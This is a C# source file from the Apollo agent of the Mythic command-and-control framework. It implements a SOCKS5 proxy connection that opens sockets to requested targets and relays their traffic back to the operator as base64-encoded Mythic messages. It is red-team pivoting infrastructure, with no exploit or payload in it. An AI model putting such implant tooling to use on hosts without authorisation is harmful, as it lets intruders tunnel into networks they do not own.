using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Apollo.SocksProxy.Classes;
using Mythic.Structs;
using System.Runtime.Serialization;
using System.Collections;
using Apollo.CommandModules;
using System.Windows.Forms;
using System.Runtime.Remoting.Contexts;
using static Utils.DebugUtils;
using static Utils.ByteUtils;
using Utils.ErrorUtils;
using Apollo.SocksProxy.Enums;
using Apollo.SocksProxy.Structs;

namespace Apollo.SocksProxy.Classes
{
    public class ProxyConnection
    {
        private static Random rnd = new Random();

        private Queue requestData = new Queue();
        private Queue syncRequestData;

        private Queue responseData = new Queue();
        private Queue syncResponseData;

        private bool exited = false;
        public int ServerID { get; private set; }
        public Socket ClientConnection { get; private set; } = null;
        public AddrSpec Bind { get; private set; } = new AddrSpec();

        private Thread WriteThread = null;
        private Thread ReadThread = null;

        private readonly ManualResetEvent exitEvent = new ManualResetEvent(false);
        
        public delegate void DisconnectEvent(int serverID);
        public DisconnectEvent OnDisconnect { get; private set; }



        public string IPAddress { get; private set; } = "";
        private static int MESSAGE_SIZE = 512000;

        public const int ConnectCommand = 1;
        public const int NoAuth = 0;
        public const int socks5Version = 5;
        private static System.Net.IPAddress localhostIPAddr = System.Net.IPAddress.Parse("127.0.0.1");

        public ProxyConnection(int serverID, byte[] connectMsg, DisconnectEvent disconFunc)
        {
            OnDisconnect = disconFunc;
            ServerID = serverID;
            syncRequestData = Queue.Synchronized(requestData);
            syncResponseData = Queue.Synchronized(responseData);

            Request r = ParseAddrSpec(connectMsg);
            IPAddress = r.DestAddr.IP.ToString();
            if (!DispatchRequest(r))
            {
                throw new SocksException("Unknown error has occurred.", SocksError.Disconnected);
            }
        }

        private Request ParseAddrSpec(byte[] data)
        {
            int dataIndex = 0;
            int headerIndex = 0;
            byte[] header = new byte[3];
            byte[] address = null;
            IPAddress targetIP = null;
            int targetPort;
            AddrSpec addrSpec = new AddrSpec() { FQDN = "", IP = null, Port = -1 };
            SocksError errorResponse;
            if (data.Length <= 1)
            {
                throw new SocksException("Datagram was an invalid length.", SocksError.InvalidDatagram);
            }
            if (data.Length < 3)
            {
                throw new SocksException("Datagram was an invalid length.", SocksError.InvalidDatagram);
            }

            Array.Copy(data, header, 3);
            dataIndex += 3;
            // gonna assume this means fail to read header
            if (header[0] != socks5Version)
            {
                throw new SocksException($"Got header frame requesting invalid SOCKS version {header[0]}.", SocksError.CommandNotSupported);
            }
            AddressType ipType = (AddressType)data[dataIndex];
            dataIndex += 1;
            switch (ipType)
            {
                case AddressType.IPv4Address:
                    address = new byte[4];
                    Array.Copy(data, dataIndex, address, 0, 4);
                    targetIP = new IPAddress(address);
                    dataIndex += 4;
                    addrSpec = new AddrSpec()
                    {
                        FQDN = "",
                        IP = targetIP
                    };
                    break;
                case AddressType.IPV6Address:
                    address = new byte[16];
                    Array.Copy(data, dataIndex, address, 0, 16);
                    targetIP = new IPAddress(address);
                    dataIndex += 16;
                    addrSpec = new AddrSpec()
                    {
                        FQDN = "",
                        IP = targetIP,
                    };
                    break;
                case AddressType.FQDNAddress:
                    int addrLength = data[dataIndex];
                    dataIndex += 1;
                    byte[] fqdnBytes = new byte[addrLength];
                    Array.Copy(data, dataIndex, fqdnBytes, 0, addrLength);
                    dataIndex += addrLength;
                    string fqdn = Encoding.UTF8.GetString(fqdnBytes);
                    try
                    {
                        var ipEntry = Dns.GetHostEntry(fqdn);
                        if (ipEntry.AddressList.Length == 0)
                            break;
                        foreach (var ipaddr in ipEntry.AddressList)
                        {
                            if (ipaddr.ToString().Contains("."))
                            {
                                targetIP = ipaddr;
                                break;
                            }
                        }
                        if (targetIP == null)
                            targetIP = ipEntry.AddressList[0];
                        addrSpec = new AddrSpec()
                        {
                            FQDN = fqdn,
                            IP = targetIP
                        };
                        break;
                    }
                    catch (Exception ex)
                    {
                        //DebugWriteLine($"Error while resolving FQDN: {ex.Message}");
                        //if (ByteSequenceEquals(data, new byte[] { 5, 1, 0, 5}) || ByteSequenceEquals(data, new byte[] { 5,2,0,2}))
                        //{
                        //    var msg = new SocksDatagram()
                        //    {
                        //        server_id = conn.ServerID,
                        //        data = Convert.ToBase64String(new byte[] { 5, 0 })
                        //    };
                        //    AddMythicMessageToQueue(msg);
                        //}
                        //new Thread(() => RemoveProxyConnection(conn)).Start();
                        break;
                    }
                default:
                    //DebugWriteLine("AddrType was not IPv4, IPv6, or FQDN!");
                    //if (ByteSequenceEquals(data, new byte[] { 5, 1, 0, 5 }) || ByteSequenceEquals(data, new byte[] { 5, 2, 0, 2 }))
                    //{
                    //    var msg = new SocksDatagram()
                    //    {
                    //        server_id = conn.ServerID,
                    //        data = Convert.ToBase64String(new byte[] { 5, 0 })
                    //    };
                    //    AddMythicMessageToQueue(msg);
                    //}
                    //new Thread(() => RemoveProxyConnection(conn)).Start();
                    break;
            }
            if (targetIP == null)
            {
                throw new SocksException(SocksError.AddrTypeNotSupported);
            }
            if (data.Length < (dataIndex + 2))
            {
                throw new SocksException(SocksError.ServerFailure);
            }

            byte[] portBytes = new byte[2];
            Array.Copy(data, dataIndex, portBytes, 0, 2);
            dataIndex += 2;
            targetPort = ((int)portBytes[0] << 8) | (int)portBytes[1];
            addrSpec.Port = targetPort;

            Request request = new Request()
            {
                Version = socks5Version,
                Command = header[1],
                DestAddr = addrSpec,
                //BufCon = conn
            };
            int clientPort = rnd.Next(60000, 65536);
            AddrSpec clientAddr = new AddrSpec()
            {
                FQDN = "",
                IP = System.Net.IPAddress.Parse("127.0.0.1"),
                Port = clientPort
            };

            request.RemoteAddr = clientAddr;
            IPAddress destIPAddr;
            if (request.DestAddr.FQDN != "")
            {
                if (request.DestAddr.IP == null)
                {
                    //DebugWriteLine("About to resolve FQDN");
                    var dnsEntry = Dns.GetHostEntry(request.DestAddr.FQDN);
                    if (dnsEntry.AddressList.Length == 0)
                    {
                        throw new SocksException(SocksError.HostUnreachable);
                    }
                    request.DestAddr.IP = dnsEntry.AddressList[0];

                }
            }

            return request;
        }

        private bool DispatchRequest(Request request)
        {
            bool bRet = false;
            switch (request.Command)
            {
                case ConnectCommand:
                    var bind = new AddrSpec();
                    int bindPort = rnd.Next(65000, 65536);
                    IPEndPoint localEndpoint = new IPEndPoint(localhostIPAddr, bindPort);
                    bind.FQDN = "";
                    bind.IP = localhostIPAddr;
                    bind.Port = bindPort;
                    Socket target;
                    try
                    {
                        if (request.DestAddr.IP.AddressFamily == AddressFamily.InterNetwork)
                            target = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        else
                            target = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
                    }
                    catch (Exception ex)
                    {
                        throw new SocksException("Failed to create socket for address.", SocksError.ConnectionRefused);
                    }
                    //target.Bind(localEndpoint);

                    //TcpClient target = new TcpClient(localEndpoint);
                    try
                    {
                        target.Connect(request.DestAddr.IP.ToString(), request.DestAddr.Port);
                    }
                    catch (Exception ex)
                    {
                        throw new SocksException($"Failed on client connect to {request.DestAddr.IP.ToString()}", SocksError.HostUnreachable, ex);
                    }
                    bRet = true;
                    //DebugWriteLine($"Successfully connected to {request.DestAddr.IP.ToString()}");
                    ClientConnection = target;
                    Bind = bind;
                    //var msgToSend = CreateFormattedMessageWithLength(SocksError.SuccessReply, bind, conn);
                    //AddMythicMessageToQueue(msgToSend);
                    //new Thread(() => conn.StartRelay()).Start();
                    break;
                default:
                    throw new SocksException($"Command not supported: {request.Command}", SocksError.CommandNotSupported);
            }
            return bRet;
        }

        public void StartRelay()
        {
            WriteThread = new Thread(() => WriteToProxy());
            ReadThread = new Thread(() => ReadFromProxy());
            WriteThread.Start();
            ReadThread.Start();
            new Thread(() => Close());
        }

        public bool EnqueueRequestData(byte[] data)
        {
            //DebugWriteLine($"{IPAddress} ({ServerID}) attempting to enqueue request data...");
            syncRequestData.Enqueue(data);
            //DebugWriteLine($"{IPAddress} ({ServerID}) request data successfully enqueued!");
            return true;
        }

        public byte[] GetRequestData()
        {
            byte[] data;
            while (!exited)
            {
                if (syncRequestData.Count > 0)
                {
                    data = (byte[])syncRequestData.Dequeue();
                    return data;
                }
            }
            return null;
        }

        public void Close()
        {
            // Something called close twice, so let's just wait for the other thread to finish.
            if (exited)
                exitEvent.WaitOne();
            // Initialize close sequence
            else
            {
                exited = true;
                //if (ReadThread != null && WriteThread != null)
                //{
                //    if (ReadThread.IsAlive || WriteThread.IsAlive)
                //    {
                //        ReadThread.Join();
                //        WriteThread.Join();
                //    }
                //}
                // Kill the socket.
                if (ClientConnection != null)
                {
                    try
                    {
                        ClientConnection.Close();
                    }
                    catch (Exception ex)
                    {
                        //DebugWriteLine($"Error closing socket to {IPAddress}: {ex.Message}");
                    }
                }
                // Remove everything.
                OnDisconnect(this.ServerID);
                // Notify other callers you can terminate.
                exitEvent.Set();
            }
        }

        public bool EnqueueResponseData(byte[] data)
        {
            //DebugWriteLine($"{IPAddress} ({ServerID}) attempting to enqueue response data...");
            syncResponseData.Enqueue(data);
            //DebugWriteLine($"{IPAddress} ({ServerID}) response data successfully enqueued!");
            return true;
        }

        private void WriteToProxy()
        {
            byte[] msgToSend = null;
            while (!exited)
            {
                //DebugWriteLine($"{IPAddress} ({ServerID}) waiting for data to send...");
                msgToSend = GetRequestData();
                //DebugWriteLine($"{IPAddress} ({ServerID}) Got data to send!");
                if (msgToSend == null || msgToSend.Length == 0 || msgToSend == SocksController.DisconnectMessageBytes)
                {
                    break;
                    //DebugWriteLine($"{IPAddress} ({ServerID}) Got close from ProxyChains.");
                }
                try
                {
                    //DebugWriteLine($"{IPAddress} ({ServerID}) Attempting to send data through the socket...");
                    ClientConnection.Send(msgToSend);
                    //DebugWriteLine($"{IPAddress} ({ServerID}) Sent data through the socket!");
                }
                catch (SocketException ex)
                {
                    // L316 socks.go - need more verbose error handling and terminating of connections
                    // based on exception
                    DebugWriteLine($"Error when writing to {IPAddress} ({ServerID}): {ex.Message} ({ex.SocketErrorCode})");
                    break;
                    //if (ex.SocketErrorCode == SocketError.ConnectionAborted || ex.SocketErrorCode == SocketError.ConnectionReset)
                    //{
                    //    SocksController.SendDisconnectRemoveConnection(this);
                    //}
                    //else
                    //{
                    //    SocksController.SendErrorRemoveConnection(this);
                    //}
                }
                catch (Exception ex)
                {
                    //exitEvent.Set();
                    DebugWriteLine($"Unhandled error when writing to {IPAddress} ({ServerID}): {ex.Message}");
                    //SocksController.SendDisconnectRemoveConnection(this);
                    break;
                }
            }
            Close();
            ////DebugWriteLine($"{IPAddress} exited or got disconnect message.");
            //SocksController.RemoveProxyConnection(this);
        }

        private void ReadFromProxy()
        {
            ClientConnection.ReceiveTimeout = 10000;
            while (!exited)
            {
                byte[] bufIn = new byte[MESSAGE_SIZE];
                int totalRead = 0;
                try
                {
                    ////DebugWriteLine($"Attempting to read data from {IPAddress}");

                    totalRead = ClientConnection.Receive(bufIn);
                }
                catch (SocketException ex)
                {
                    //ExitEvent.Set();
                    DebugWriteLine($"{IPAddress} ({ServerID}) error while reading from socket: {ex.Message} ({ex.SocketErrorCode}).");
                    break;
                }
                catch (Exception ex)
                {
                    //ExitEvent.Set();
                    DebugWriteLine($"{IPAddress} ({ServerID}) Unhandled exception while reading from socket: {ex.Message}");
                    //SocksController.SendDisconnectRemoveConnection(this);
                    break;
                }
                //Console.WriteLine($"Read {totalRead} bytes from {conn.ServerID}");
                if (totalRead > 0)
                {
                    byte[] dataToSend = new byte[totalRead];
                    //DebugWriteLine($"{IPAddress} ({ServerID}) Beginning data copy into new array...");
                    Array.Copy(bufIn, dataToSend, totalRead);
                    //DebugWriteLine($"{IPAddress} ({ServerID}) Finished copying data into new array.");
                    SocksDatagram msg = new SocksDatagram()
                    {
                        server_id = ServerID,
                        data = Convert.ToBase64String(dataToSend),
                    };
                    SocksController.AddMythicMessageToQueue(msg);
                }
            }
            Close();
        }

    }
}
